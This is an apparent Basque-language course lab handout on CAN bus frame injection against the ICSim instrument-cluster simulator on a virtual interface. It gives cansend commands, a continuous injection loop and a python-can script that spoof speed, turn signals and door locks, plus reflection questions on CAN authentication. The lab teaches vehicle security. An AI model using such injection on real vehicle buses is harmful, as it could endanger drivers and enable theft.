# B Praktika — CAN Frame Injekzioa

[Gaztelaniazko bertsioa](05_Practica_B_Inyeccion.md)

**Estimatutako iraupena:** 40 minutu  
**Zailtasuna:** Ertaina  
**Tresnak:** `cansend`, `python-can`

---

## Helburua

CAN bus-eko edozein nodok edozein Arbitration IDrekin tramak bidal ditzakeela frogatzea, jatorriari buruzko egiaztapenik gabe. A Praktikako ezagutzak erabilita, aginte-mando legitimoa (`controls`) erabili gabe aginte-panelaren (ICSim) **kontrola hartzea**.

---

## Testuingurua

CAN frame injekzioa protokoloren aurkako eraso zuzenena da. Honako hauek kontuan hartuta:
- Nodo guztiek mezu guztiak jasotzen dituzte.
- CAN tramak ez du "jatorri" eremurik.
- Ez dago autentifikaziorik.

...bus-era konektatutako edozein gailuk tramak bidal ditzake, eta hartzaileek legitimoak balira bezala prozesatuko dituzte.

Benetako ikerketek injekzio erasoak frogatu dituzte:
- 100 km/h-an ABS desaktibatzea (Miller eta Valasek, 2015 — Jeep Cherokee).
- Ibilgailua mugitzen den bitartean ateak irekitzea.
- Aginte-panelean abiadura faltsuak erakustea.

---

## Aurrebaldintzak

- A Praktika amaituta (ID eta byte garrantzitsuak ezagutzen).
- `vcan0` aktibo.
- ICSim martxan (`controls` gabe — injekzioak agintea ordezkatzen du).

---

## B.1 Ariketa — `cansend`-ekin oinarrizko injekzioa

### cansend-en formatua

```
cansend <interfazea> <ID>#<datu_hex>
```

Datuak byte hexadezimalen bikoteak dira. 8 byte = 16 karaktere hex.

### Abiadura kontrolatu

```bash
# Abiadura 0 (geldirik)
cansend vcan0 244#0000000000000000

# Erdiko abiadura (~128/255)
cansend vcan0 244#0000000080000000

# Abiadura maximoa (255/255)
cansend vcan0 244#00000000FF000000
```

ICSim-en abiaduragailua igo eta jaisten ikusi.

### Txandakatzaileak kontrolatu

```bash
# Txandakatzailerik gabe
cansend vcan0 188#0000000000000000

# Ezkerreko txandakatzearen adierazlea
cansend vcan0 188#0100000000000000

# Eskuineko txandakatzearen adierazlea
cansend vcan0 188#0200000000000000

# Bi adierazleak (larrialdiko argiak)
cansend vcan0 188#0300000000000000
```

### Ateak kontrolatu

```bash
# Ate guztiak blokeatuta
cansend vcan0 19B#0F00000000000000

# Ate guztiak desblokeatuta
cansend vcan0 19B#0000000000000000

# 1. atea soilik desblokeatuta (0. bita = 1)
cansend vcan0 19B#0100000000000000
```

---

## B.2 Ariketa — Etengabeko suplantazio erasoa

`cansend` bakarrak trama bakarra bidaltzen du. Aginte-panelean balio bat **mantentzeko** (normalean ~60 Hz-tan eguneratzen dena), etengabe bidali behar da.

### Shell bidezko injekzio begizta

```bash
# Abiaduragailua maximoan mantendu ICSim-ek bere maiztasun normalarekin
while true; do
    cansend vcan0 244#00000000FF000000
    sleep 0.016  # ~60 Hz
done
```

Terminal batean exekutatu eta ikusi abiaduragailua maximoan finkatuta geratzen dela `controls`-eko ezein tekla sakatu gabe.

### Bertan behera utzi

```bash
Ctrl+C
```

---

## B.3 Ariketa — Python-etik injekzioa `python-can`-ekin

Python scriptak kontrol gehiago ematen du (timing, ereduak, logging).

```bash
source .venv/bin/activate
```

```python
import can
import time

bus = can.interface.Bus(channel='vcan0', bustype='socketcan')

# Abiaduragailua 0-tik maximora igotzen errampan
for speed in range(0, 256, 5):
    data = [0x00, 0x00, 0x00, 0x00, speed, 0x00, 0x00, 0x00]
    msg = can.Message(arbitration_id=0x244, data=data, is_extended_id=False)
    bus.send(msg)
    time.sleep(0.05)
    print(f"Abiadura: {speed}/255 → {speed * 100 // 255} km/h baliokidea")

bus.shutdown()
```

Exekutatu:
```bash
python scripts/rampa_velocidad.py
```

Abiaduragailua poliki-poliki 0-tik maximora igotzen ikusi.

---

## B.4 Ariketa — Erronka: ekintza konposatu sekuentzia

Helburua: `controls` ukitu gabe jarraian ekintzen sekuentzia bat simulatzea:

1. Ibilgailua frenatu (abiadura 3 segundo bitartean maximotik 0-ra jaisten).
2. Larrialdiko argiak aktibatu (bi txandakatzaileak).
3. 4 ateak desblokeatu.

```bash
# Pista: begiztak eta cansend sleep-ekin konbinatu
# Taldeak scriptta osatu behar du
```

Ebidentzia gisa osatutako scripta entregatu.

---

## B.5 Ariketa — Nodo gatazka (injekzioa vs. controls)

`controls` **eta** abiaduraren injekzio begizta **aldi berean** exekutatu.

```bash
# 1. terminala: controls normala
./ICSim/builddir/controls vcan0

# 2. terminala: abiadura maximoaren injekzioa
while true; do cansend vcan0 244#00000000FF000000; sleep 0.016; done
```

### Galderak

- Zer erakusten du abiaduragailuak? Injekzioak irabazten du ala kontrol legitimoak?
- Zergatik? (Pista: bidaltzeko maiztasuna eta CAN arbitrajea)
- Nola ziurta dezake erasotzaile batek bere tramak nodo legitimoarenak "irabazten" duela?

---

## B Praktikaren entregagaiak

1. ICSim-en pantaila-argazkia injekzioak eragindako abiaduragailua maximoan.
2. ICSim-en pantaila-argazkia injekzioak eragindako bi txandakatzaileak aktibo.
3. B.4 ariketako ekintza konposatuen scripta.
4. B.5 ariketako galderen erantzunak.

---

## Azken gogoeta

- Zer desberdintasun dago eraso honen eta IP sistema arrunt baten erasoaren artean?
- Zergatik da zaila CAN bus-en denbora errealeko autentifikazioa inplementatzea?
- Ezagutzen al duzu CAN-i segurtasuna gehitzeko proposatutako estandarrik? (Pista: CAN-SEC, CANAuth, AUTOSAR SecOC)
